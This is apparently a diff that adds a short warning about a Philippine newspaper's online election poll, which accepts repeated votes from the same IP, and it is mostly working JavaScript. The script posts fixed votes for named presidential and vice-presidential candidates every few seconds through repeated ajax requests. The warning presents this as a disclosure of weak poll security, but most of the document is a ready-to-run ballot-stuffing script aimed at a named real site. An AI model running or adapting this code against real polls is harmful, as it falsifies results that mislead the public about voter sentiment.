@@ -55,3 +55,103 @@ var domainName = window.location.protocol + "//" + window.location.host;
 	},5000);
 	
 	http://bilangpilipino.philstar.com/mock-poll
+
+
+
+"The TRUTH behind online voting polls"
+
+
+Be careful trusting online polls as they are
+easily tampered by simple automated scripts.
+
+I stumbled upon an online poll....
+
+http://bilangpilipino.philstar.com/mock-poll
+Philstar's online poll is the easiest poll to be hacked so far
+
+1. They are allowing multiple votes of the same IP.
+	- We can submit votes as much as we can as long as we have an automated script(Or you're okay with clicking through the whole process over and over).
+2. Their source code is not secured.
+	- There are no security measures to ensure that blah blah blah
+
+
+As web developers, we are NOT discrediting any site or entity, we
+want our source codes to be as secured as possible specially when
+it affects people's decisions.
+
+At the end of the day, these online polls should not be our basis
+and should NOT influence our decisions this coming elections.   
+
+as big as a company as Philistar.com, We expect them to deliver a good poll. 
+
+
+var domainName = window.location.protocol + "//" + window.location.host;
+		var currentUrl = domainName + "/" + window.location.pathname;
+			var conf = {
+				url : currentUrl,
+				type : "POST",
+				data : {
+					"president":[{"name":"DUTERTE, RODRIGO","partyList":"PARTIDO DEMOKRATIKO PILIPINO LAKAS NG BAYAN"}],
+					"vicePresident":[{"name":"CAYETANO, ALAN PETER","partyList":"INDEPENDENT"}],
+					} ,
+					
+			}	
+	setInterval(function(){
+		$.ajax({
+			  url: conf.url,
+			  type: conf.type,
+			  data: conf.data,
+			  dataType: "html",
+			});
+	},7000);
+	var domainName = window.location.protocol + "//" + window.location.host;
+		var currentUrl = domainName + "/" + window.location.pathname;
+			var conf = {
+				url : currentUrl,
+				type : "POST",
+				data : {
+					"president":[{"name":"BINAY, JEJOMAR","partyList":"UNITED NATIONALIST ALLIANCE"}],
+					"vicePresident":[{"name":"CAYETANO, ALAN PETER","partyList":"INDEPENDENT"}],
+					} ,
+					
+			}	
+	setInterval(function(){
+		$.ajax({
+			  url: conf.url,
+			  type: conf.type,
+			  data: conf.data,
+			  dataType: "html",
+			});
+	},5000);
+	
+			
+			var myVotes = {};
+		function isNoSelected(){
+			
+			myVotes["president"] = [];
+			var thisInput = "";
+			$(".president-party-wrap li").each(function(index){
+				thisInput = $(this).find("input[type='radio']:checked");
+				if (thisInput.val()){
+					
+					$.each(myVotes, function(index, value){
+						if(index == "president"){
+							console.log(index);
+							value.push({
+								name : thisInput.attr("itemname"),
+								partyList : thisInput.attr("itempartylist"),
+							});
+							return false;
+						}
+
+					})
+
+				}
+				
+			});
+			
+			console.log(myVotes["president"]);
+		
+			
+		}
+
